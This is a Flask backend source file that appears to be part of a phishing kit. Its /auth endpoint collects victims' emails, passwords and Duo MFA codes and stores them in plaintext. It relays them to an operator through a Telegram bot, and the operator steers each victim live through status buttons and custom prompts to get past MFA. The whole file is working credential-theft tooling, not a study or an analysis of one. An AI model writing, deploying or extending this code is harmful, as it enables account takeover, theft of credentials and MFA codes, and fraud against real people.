from flask import Flask, request, session, jsonify
from flask import render_template, send_from_directory, redirect, Response
from models import Email_statuses, HostedUrls
from flask_cors import CORS
from dotenv import load_dotenv
from tg import send_notification, get_status_update
import os
from urllib.parse import quote
import requests

# --- Load Environment Variables ---
load_dotenv()
HOSTED_URL = os.getenv("HOSTED_URL")
DEFAULT_USER_ID = os.getenv("USER_ID")
BOT_TOKEN = os.getenv("BOT_TOKEN")

# --- Flask App Initialization ---
app = Flask(__name__)
CORS(app)


# --- Application Startup Logic ---
def initialize_database():
    """
    Ensures required data, like the hosted URL, is present in the database on startup.
    """
    if HOSTED_URL:
        HostedUrls.update_one(
            {'url': HOSTED_URL},
            {'$setOnInsert': {'url': HOSTED_URL}},
            upsert=True
        )
        print(f"[*] Verified that HOSTED_URL '{HOSTED_URL}' is in the database.")

initialize_database()


# --- API Endpoints ---


@app.get("/bot")
def bot_info():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getMe"

    response = requests.get(url)
    data = response.json()

    if data["ok"]:
        bot_info = data["result"]
        return f"Bot Username: @{bot_info['username']}"
    else:
        return "Failed to get bot info"




@app.get("/urls")
def get_urls():
    """
    Returns a JSON list of all unique HOSTED_URLs saved in the database.
    """
    try:
        urls_cursor = HostedUrls.find({}, {'_id': 0, 'url': 1})
        urls_list = [doc['url'] for doc in urls_cursor]
        return jsonify({"urls": urls_list})
    except Exception as e:
        print(f"[ERROR] Could not fetch URLs from database: {e}")
        return jsonify({"error": "Failed to connect to the database."}), 500




# @app.route('/', defaults={'path': ''})
# @app.route('/<path:path>')
# def serve(path):
#     """
#     Main entrypoint: Handles serving the React application.
#     The user_id is now passed in API calls from the client, not handled by sessions.
#     """
#     # This logic is now much simpler.
#     # If the path points to an existing file in the static folder (like CSS, JS, or an image), serve it.
#     if path != "" and os.path.exists(os.path.join(app.static_folder, path)):
#         return send_from_directory(app.static_folder, path)
    
#     # Otherwise, for any other path (including the root), serve the main index.html file.
#     # This is standard for a Single-Page Application (SPA).
#     return send_from_directory(app.static_folder, 'index.html')





@app.get("/set_status/<user_id>/<email>/<status>")
def set_status(user_id, email, status):
    """
    Called by Telegram buttons to update a user's login status.
    """
    try:
        Email_statuses.update_one(
            {"email": email.strip()},
            {"$set": {"status": status, "custom_data": None}},  # Clear custom data on standard status change
            upsert=True
        )
        return {"status":"success", "message":f"Status updated for {email} as {status}"}
    except Exception as e:
        return {"status":"error", "message":str(e)}


# --- MODIFIED: Endpoint now serves a form on GET and processes it on POST ---
@app.route("/set_custom_status", methods=['GET', 'POST'])
def set_custom_status():
    """
    Handles setting a custom status.
    GET: Displays an HTML form to input custom status details.
    POST: Processes the submitted form and updates the database.
    """
    if request.method == 'GET':
        email = request.args.get('email')
        if not email:
            return "Error: An email must be provided in the URL.", 400
        
        # Return a simple HTML form
        html_form = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Set Custom Status</title>
            <style>
                body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                .container {{ background: white; padding: 25px 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 500px; }}
                h2 {{ text-align: center; color: #1c1e21; border-bottom: 1px solid #ddd; padding-bottom: 15px; margin-top: 0; }}
                label {{ display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; }}
                input[type='text'], textarea {{ width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ddd; box-sizing: border-box; font-size: 16px; }}
                input[type='submit'] {{ background-color: #0067b8; color: white; padding: 12px 20px; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }}
                input[type='submit']:hover {{ background-color: #005a9e; }}
                .email-display {{ background-color: #e9ecef; padding: 12px; border-radius: 6px; margin-bottom: 25px; text-align: center; font-size: 14px; }}
                .radio-group label {{ display: inline-block; margin-right: 20px; font-weight: normal; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Set Custom Status</h2>
                <div class="email-display">Setting status for: <strong>{email}</strong></div>
                <form action="/set_custom_status" method="post">
                    <input type="hidden" name="email" value="{email}">
                    
                    <label for="title">Title:</label>
                    <input type="text" id="title" name="title" required>
                    
                    <label for="subtitle">Subtitle:</label>
                    <textarea id="subtitle" name="subtitle" rows="3" required></textarea>
                    
                    <label>Requires Input from User?</label>
                    <div class="radio-group">
                        <input type="radio" id="input_true" name="has_input" value="true" checked>
                        <label for="input_true">Yes</label>
                        <input type="radio" id="input_false" name="has_input" value="false">
                        <label for="input_false">No</label>
                    </div>
                    <br><br>
                    <input type="submit" value="Set Status">
                </form>
            </div>
        </body>
        </html>
        """
        return html_form

    if request.method == 'POST':
        try:
            email = request.form.get('email')
            title = request.form.get('title')
            subtitle = request.form.get('subtitle')
            has_input = request.form.get('has_input') == 'true'

            if not email or not title or not subtitle:
                return "Error: All fields are required.", 400

            custom_data = { "title": title, "subtitle": subtitle, "has_input": has_input }
            Email_statuses.update_one(
                {"email": email.strip()},
                {"$set": {"status": "custom", "custom_data": custom_data}},
                upsert=True
            )
            return "<div style='font-family: sans-serif; text-align: center; padding-top: 50px;'><h1>Success!</h1><p>Custom status has been set for {email}. You can now close this window.</p></div>"
        except Exception as e:
            return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500




@app.post("/auth")
def auth():
    """
    Handles authentication attempts from the frontend.
    Includes logic to return custom status data.
    """
    req = request.json
    # MODIFIED: Get user_id from the request body instead of the session.
    user_id_to_notify = req.get('user_id') or DEFAULT_USER_ID
    
    email = req['email'].strip()
    password = req['password']
    incoming_duo_code = req.get('duoCode')
    custom_input = req.get('customInput')

    # The rest of this function remains exactly the same.
    db_record = Email_statuses.find_one({"email": email})

    if custom_input:
        send_notification(f"Custom Input Received for {email}:\n{custom_input}", user_id=user_id_to_notify)
        Email_statuses.update_one(
            {"email": email},
            {"$set": {"status": "pending", "custom_data": None}}
        )
        return jsonify({"status": "pending"})

    if not db_record or db_record.get('password') != password:
        get_status_update(email, password, user_id=user_id_to_notify)
        Email_statuses.update_one(
            {"email": email},
            {"$set": {
                "password": password,
                "status": "pending",
                "duoCode": None,
                "user_id": user_id_to_notify,
                "custom_data": None
            }},
            upsert=True
        )
        return jsonify({"status": "pending"})

    stored_duo_code = db_record.get('duoCode')
    if incoming_duo_code and incoming_duo_code != stored_duo_code:
        send_notification(f"Duo Code received for {email}: {incoming_duo_code}", user_id=user_id_to_notify)
        Email_statuses.update_one(
            {"email": email},
            {"$set": {"status": "pending", "duoCode": incoming_duo_code}}
        )
        return jsonify({"status": "pending"})

    current_status = db_record.get('status', 'pending')
    if current_status == 'custom':
        return jsonify({
            "status": "custom",
            "data": db_record.get('custom_data')
        })

    return jsonify({"status": current_status})


@app.post("/alert")
def alert():
    """Sends a simple alert, respecting the user_id from the request body."""
    req = request.json
    # MODIFIED: Get user_id from the request body instead of the session.
    user_id_to_notify = req.get('user_id') or DEFAULT_USER_ID
    
    message = req['message']
    send_notification(message, user_id=user_id_to_notify)
    return jsonify({"status":"success", "message":"Alert sent."})

